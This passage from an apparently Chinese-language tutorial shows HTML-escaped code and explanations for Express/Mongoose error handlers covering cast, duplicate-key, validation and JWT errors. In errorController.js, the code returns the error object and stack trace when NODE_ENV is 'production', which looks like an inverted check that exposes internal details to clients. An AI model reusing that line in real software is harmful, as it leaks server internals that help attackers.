class=&#34;nx&#34;&gt;el&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;message&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`无效输入: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;errors&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;. &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AppError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;400&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;handleJWTError&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AppError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;无效令牌。请重新登录!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;401&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;handleJWTExpiredError&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AppError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;您的令牌已过期!请重新登录。&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;401&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;module&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;exports&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;handleCastErrorDB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;handleDuplicateFieldsDB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;handleValidationErrorDB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;handleJWTError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;handleJWTExpiredError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;上面的代码作用：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;const handleCastErrorDB = (err) =&amp;gt;..&lt;/code&gt;部分处理MongoDB CastError，通常在传递无效ID时发生，并使用您的AppError类返回400 Bad Request错误响应&lt;/li&gt;
&lt;li&gt;&lt;code&gt;const handleDuplicateFieldsDB = (err) =&amp;gt;...&lt;/code&gt;检查并处理MongoDB重复键错误，如尝试注册已使用的电子邮件或用户名，并返回400 Bad Request错误&lt;/li&gt;
&lt;li&gt;&lt;code&gt;const handleValidationErrorDB = (err) =&amp;gt;...&lt;/code&gt;处理Mongoose验证错误(如必填字段缺失或错误数据类型)。它收集所有单独的验证错误消息并将它们合并为一个&lt;/li&gt;
&lt;li&gt;&lt;code&gt;const handleJWTError = () =&amp;gt;&lt;/code&gt;和&lt;code&gt;const handleJWTExpiredError = () =&amp;gt;&lt;/code&gt;处理由于无效、篡改或过期的JWT令牌可能发生的错误，并返回401 Unauthorized错误响应&lt;/li&gt;
&lt;li&gt;&lt;code&gt;module.exports = {……};&lt;/code&gt;部分导出所有单独的错误处理程序，以便它们可以在errorController.js文件中使用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;errorController.js:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//errorController.js
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;errorHandlers&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;./globalErrorHandler&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;handleCastErrorDB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;handleDuplicateFieldsDB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;handleValidationErrorDB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;handleJWTError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;handleJWTExpiredError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;errorHandlers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;module&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;exports&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;statusCode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;statusCode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;500&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;status&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;status&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;error&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;message&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;CastError&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;handleCastErrorDB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;code&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;11000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;handleDuplicateFieldsDB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;ValidationError&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;handleValidationErrorDB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;JsonWebTokenError&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;handleJWTError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;TokenExpiredError&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;handleJWTExpiredError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;status&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;statusCode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;status&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;status&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;...(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;NODE_ENV&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;production&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;stack&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;stack&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;为确保错误处理函数正常工作，转到您的App.js并添加命令：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//import命令
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;globalErrorHandler&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;./controller/errorController&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AppError&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;./utils/appError&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//捕获未知路由
